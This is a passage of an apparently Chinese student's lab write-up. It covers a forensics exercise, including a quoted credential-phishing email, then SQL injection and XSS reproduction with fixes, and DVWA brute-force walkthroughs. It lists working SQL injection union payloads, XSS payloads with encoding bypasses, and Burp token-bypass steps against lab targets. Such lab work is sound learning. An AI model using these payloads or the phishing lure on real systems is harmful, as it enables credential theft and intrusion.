<p><code>http &amp;&amp; ip.addr == 111.206.82.164 &amp;&amp; not (ip.addr == 172.16.61.206 &amp;&amp; ip.addr == 172.16.61.199 &amp;&amp; ip.addr == 172.16.61.200)</code></p>
<p>可以看见还攻击了172.16.61.210和172.16.60.197</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212233109001.png" alt="image-20201212233109001"></p>
<p>具体查看，发现攻击者对<code>172.16.60.197</code>，进行<code>awvs</code>扫描和爆破登录但是没有成功。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212233555600.png" alt="image-20201212233555600"></p>
<p>攻击者登录<code>172.16.61.210</code>中的<code>phpcms</code>后台成功，默认账号密码为<code>phpcms</code>，<code>phpcms</code>。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234944558.png" alt="image-20201212234944558"></p>
<p>在其他包里没有发现什么新的东西。因此最终答案。</p>
<ul>
<li>黑客的攻击ip是多少，被攻击的内网IP是多少？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">黑客攻击ip：111.206.82.164</span><br><span class="line">被攻击的内网ip：172.16.61.206，172.16.61.199，172.16.61.200 增加（172.16.61.210，172.16.60.197）</span><br></pre></td></tr></table></figure>

<ul>
<li>哪些帐号被黑客窃取了(填写帐号名)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">it@t3sec.cc,admin,lixiaofei</span><br></pre></td></tr></table></figure>

<ul>
<li> 黑客的服务器ip是多少</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111.206.82.164</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客使用了什么工具？</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awvs、sqlmap、angel.php(大马)</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客给哪2个帐号发送了钓鱼邮件？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">lixiaofei@t3sec.cc</span><br><span class="line">it@t3sec.cc</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客伪造的邮件标题和内容是什么？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">标题：系统升级，请大家注意</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body dir=&quot;ltr&quot;&gt;</span><br><span class="line">&lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;div style=&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;&gt;</span><br><span class="line">&lt;div&gt;大家好。&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录&lt;a _src=&quot;http://118.194.196.232:8084/get.php&quot; href=&quot;http://118.194.196.232:8084/get.php&quot;&gt;http://118.194.196.232:8084/get.php&lt;/a&gt; 填写自己的帐号以便配合系统升级。</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp; 谢谢大家！ &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;span&gt;&lt;/span&gt;&lt;br&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客使用了哪个邮箱给员工发送了钓鱼邮件？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">两个邮箱：</span><br><span class="line">xsser@live.cn</span><br><span class="line">clickjacking@163.com</span><br></pre></td></tr></table></figure>

<ul>
<li>哪两个员工点开了黑客的<code>email</code>链接(填写员工<code>email</code>地址)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">it@t3sec.cc</span><br><span class="line">lixiaofei@t3sec.cc</span><br></pre></td></tr></table></figure>

<ul>
<li>请指出黑客使用的扫描器指纹是什么？(简称)</li>
</ul>
<table>
<thead>
<tr>
<th align="left">扫描器指纹</th>
<th align="left">扫描器</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>vulnweb</code>, <code>acunetix</code>,<code>acunetix_wvs_test</code>,<code>acunetix/wvs</code>,<code>acunetix_test</code></td>
<td align="left"><code>awvs</code></td>
</tr>
<tr>
<td align="left"><code>sqlmap</code></td>
<td align="left"><code>sqlmap</code></td>
</tr>
<tr>
<td align="left"><code>eval</code>,<code>pass</code></td>
<td align="left"><code>angel.php</code></td>
</tr>
</tbody></table>
<h2 id="3-课程sqli、xss复现"><a href="#3-课程sqli、xss复现" class="headerlink" title="3 课程sqli、xss复现"></a>3 课程sqli、xss复现</h2><h3 id="sqli-漏洞复现"><a href="#sqli-漏洞复现" class="headerlink" title="sqli 漏洞复现"></a>sqli 漏洞复现</h3><p>php源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_POST[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line">$db= mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Fail&quot;</span>);</span><br><span class="line">mysqli_select_db($db,<span class="string">&quot;study_sqli&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;select * from user where id=&#x27;<span class="subst">$name</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;table border=1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($result= mysqli_query($db,$sql))&#123;</span><br><span class="line"><span class="keyword">while</span>($array=mysqli_fetch_row($result))&#123;</span><br><span class="line">    printf(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;tr&gt;&quot;</span>,$array[<span class="number">0</span>],$array[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析sql语句<code>select * from user where id=&#39;$name&#39; and passwd=&#39;$passwd&#39;</code>可以知道存在字符型注入漏洞。</p>
<ul>
<li><p>验证字符型注入</p>
<p>输入admin’ and ‘1’=’2’ #</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175800228.png" alt="image-20201212175800228"></p>
</li>
</ul>
<p>结果为空<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175430810.png" alt="image-20201212175430810"></p>
<p>输入admin’ and ‘1’=’1’ #</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175720802.png" alt="image-20201212175720802"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175733839.png" alt="image-20201212175733839"></p>
<p>成功，说明and被执行。</p>
<p><strong>原理解释：</strong></p>
<p>首先，admin’将第一个’闭合，之后and ‘1’=’1’ 或者 and ‘1’=’2’是完整的查询。考虑到这是两个输入，使用#注释掉之后的语句，password可以任意填。</p>
<ul>
<li>确定sql语句的字段数</li>
</ul>
<p>要获取数据库名、表明等，一定会用到union查询。而union查询需要与主查询的列数相同，所以要先确定sql语句的字段数</p>
<p>利用union的特性来猜测。</p>
<p>输入<code> admin&#39; union select 1 #</code>。失败<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181640702.png" alt="image-20201212181640702"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181655614.png" alt="image-20201212181655614"></p>
<p>输入<code> admin&#39; union select 1,2 #</code>，成功</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181725925.png" alt="image-20201212181725925"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181740450.png" alt="image-20201212181740450"></p>
<p>所以可以确定字段数为两个。</p>
<ul>
<li>获得数据库名</li>
</ul>
<p>有了上述的基础，只需要union查询中加一个<code>select database() </code>就可以得到数据库名。</p>
<p>输入<code>admin&#39; union select 1,database() #</code>成功得到数据库名“study_sqli”</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212182113902.png" alt="image-20201212182113902"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212182122278.png" alt="image-20201212182122278"></p>
<ul>
<li>获得表名</li>
</ul>
<p>类似于获得数据库名的步骤，只需要考虑如何查询表名即可。</p>
<p>查询语句<code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code>是一个通用的查询语句。</p>
<p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据就是关于数据的数据也就是数据库名、表名等。</p>
<p>因此，输入<code>admin&#39; union  select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#</code>成功得到表名users。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183402320.png" alt="image-20201212183402320"></p>
<ul>
<li>获得列名</li>
</ul>
<p>知道表名，获得列名就变得十分简单。</p>
<p><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;</code>这也是一个比较通用的写法。</p>
<p>最终输入时，加上了一个限制条件为table_schema=database()，是为了防止查询到其他数据库中相同表名的列。</p>
<p>输入<code>admin&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()</code> #`成功获得列名。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183134546.png" alt="image-20201212183134546"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183858597.png" alt="image-20201212183858597"></p>
<ul>
<li>获取数据</li>
</ul>
<p>知道列名，就可以获取表里的数据。</p>
<p>输入<code>admin&#39; or 1=1 union select 1,group_concat(id,passwd) from users #</code>    admin’ or 1=1永真，结合后面的union语句，就可以得到所有用户的数据。</p>
<p><img src="C:/Users/lsh/AppData/Roaming/Typora/typora-user-images/image-20201212184505545.png" alt="image-20201212184505545"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212184527129.png" alt="image-20201212184527129"></p>
<h3 id="sqli-漏洞修复"><a href="#sqli-漏洞修复" class="headerlink" title="sqli 漏洞修复"></a>sqli 漏洞修复</h3><p>sql语句的预编译是防御sql注入的最佳方法。预编译，是先将sql语句编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划。因此输入的参数不会影响到sql语句的结构。成功做到将程序和数据分开，有效的防御了sql注入攻击。</p>
<p>php有提供预编译的功能，只需要使用即可。</p>
<p>修改后的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_POST[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;study_sqli&#x27;</span>);</span><br><span class="line">$stmt = $mysqli-&gt;prepare(<span class="string">&quot;select * from users where id=? and passwd=?&quot;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,$name,$passwd);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;table border=1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($mysqli-&gt;affected_rows)&#123;</span><br><span class="line">	$result=$stmt-&gt;get_result();</span><br><span class="line">	<span class="keyword">while</span> ($row=$result-&gt;fetch_assoc()) &#123;</span><br><span class="line">		printf(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;tr&gt;&quot;</span>,$row[<span class="string">&quot;name&quot;</span>],$row[<span class="string">&quot;passwd&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h3><p>源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;please input your name:&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;welcome.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&#39;name&#39;,&#39;lsh&#39;);</span><br><span class="line">echo $_POST[&#39;username&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214082643819.png" alt="image-20201214082643819"></p>
<p>当服务器输出我们的内容，并且内容回显到客户端的时候，如果我们一开始输入的内容很正常的话，那么回显我们输入的内容是没有问题的，但是如果我们输入的内容是浏览器可以解析的代码的时候，浏览器就会执行我们想要他执行的代码。</p>
<p>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083433435.png" alt="image-20201214083433435"></p>
<p>有时候，会过滤<code>&lt;script&gt;</code>标签，这时候可以通过img、iframe等其它危险的标签来执行程序。</p>
<p>输入<code>&lt;img src=1 onerror=alert(/img/)&gt;</code>，成功得到弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083930675.png" alt="image-20201214083930675"></p>
<p>如果网页对&lt;，&gt;,’，”等字符进行过滤，就需要进行编码绕过。</p>
<p>lE默认采用UNICODE编码，HTML编码可用&amp;#ASCI方式来写。</p>
<p>输入如下代码，与<code>&lt;img src=&quot;javascript:alert(&#39;\xss、&#39;)&quot;&gt;</code>效果是一样的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">src&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&#39;&amp;#88;&amp;#83;&amp;#83;&#39;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083433435.png" alt="image-20201214083433435"></p>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>可以显示cookie。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214084720002.png" alt="image-20201214084720002"></p>
<h3 id="XSS漏洞修复"><a href="#XSS漏洞修复" class="headerlink" title="XSS漏洞修复"></a>XSS漏洞修复</h3><p>对输出进行html编码可以避免执行脚本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;lsh&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="4-dvwa"><a href="#4-dvwa" class="headerlink" title="4 dvwa"></a>4 dvwa</h2><ul>
<li><p>实验环境</p>
<p>Damn Vulnerable Web Application (DVWA) v1.10</p>
</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212164645298.png" alt="image-20201212164645298"></p>
<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>首先设置好浏览器代理，这里使用一个插件就不用每次都手动设置。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100318762.png" alt="image-20201213100318762"></p>
<ol>
<li><strong>安全级别 low</strong></li>
</ol>
<p>首先拦截登录，并发送给爆破模块。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100522847.png" alt="image-20201213100522847"></p>
<p>进行基本设置</p>
<ul>
<li>先将选择的清空</li>
<li>再选中需要爆破的字段</li>
<li>由于有两个需要爆破，选择模式Cluster bomb</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100629362.png" alt="image-20201213100629362"></p>
<p>设置payload</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234240331.png" alt="image-20201212234240331"></p>
<p>设置线程</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234259179.png" alt="image-20201212234259179"></p>
<p>开始攻击，发现这个返回长度与其他不一致。查看相应，可以知道这就是账户和密码。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213103139297.png" alt="image-20201213103139297"></p>
<p>登录成功的界面</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213103302154.png" alt="image-20201213103302154"></p>
<ol start="2">
<li><strong>安全级别 medium</strong></li>
</ol>
<p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> 	</span><br></pre></td></tr></table></figure>

<p>​    可以看出，与low相比就是增加了mysqli_real_escape_string(str)函数来对sql注入做一个防护，但是对爆破没有任何防护。所以low级别的方法在这里依旧适用。</p>
<p>重复之前的步骤，可以得到爆破结果，任然是admin与password。</p>
<ol start="3">
<li><strong>安全级别high</strong></li>
</ol>
<p>首先查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以发现，比之前多加了一个token的获取和对sql注入放入防护更加完全。</p>
<p>但同样还是可以使用burp爆破，但需要设置好token的获取。</p>
<p>设定好参数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155135852.png" alt="image-20201213155135852"></p>
<p>将password设为参数1，为了节省时间，设置小字典。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/1838411-20200302221946296-907908890.png" alt="img"></p>
<p>token需要从页面中获取，同时要设置为跟随重定向。options-&gt;redirection设置为always</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155419513.png" alt="image-20201213155419513"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155506322.png" alt="image-20201213155506322"></p>
<p>然后将token设为参数二，开始攻击。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155550247.png" alt="image-20201213155550247"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/1838411-20200302221728303-1028135210.png" alt="img"></p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><ol>
<li><strong>安全级别low</strong></li>
</ol>
<ul>
<li>判断是否存在注入，注入的类型</li>
</ul>
<p>输入1，成功查询</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172122987.png" alt="image-20201212172122987"></p>
<p>输入1’ and ‘1’ = ‘2，查询失败，返回结果是空。</p>
